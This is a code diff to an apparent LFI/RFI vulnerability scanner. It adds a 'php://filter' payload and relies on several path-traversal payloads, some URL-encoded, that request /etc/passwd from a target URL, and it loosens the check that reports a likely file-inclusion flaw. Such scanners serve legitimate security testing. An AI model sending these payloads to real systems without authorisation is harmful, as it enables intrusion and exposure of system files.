@@ -16,6 +16,7 @@ class xfiController():
             '../../../../../..//etc/passwd',
             '../../../../../../..//etc/passwd',
             '../../../../../../../..//etc/passwd',
+            'php://filter/resource=/etc/passwd',
             '%2e%2e//etc/passwd',
             '%2e%2e/%2e%2e//etc/passwd',
             '%2e%2e/%2e%2e/%2e%2e//etc/passwd',
@@ -39,7 +40,7 @@ class xfiController():
             full_url = config['url'] + payload
             try:
                 response = requests.get(full_url)
-                if response.status_code == 200 and 'open_basedir' in response.text:
+                if response.status_code == 200 and ('open_basedir' in response.text or 'root' in response.text):
                     print(f'[!] Potential LFI vulnerability detected with payload: {payload}')
                 elif response.status_code == 200 and 'malicious' in response.text:
                     print(f'[!] Potential RFI vulnerability detected with payload: {payload}')
@@ -48,3 +49,5 @@ class xfiController():
 
     def rfi(self):
         print(self.rfiPayload)
+
+        
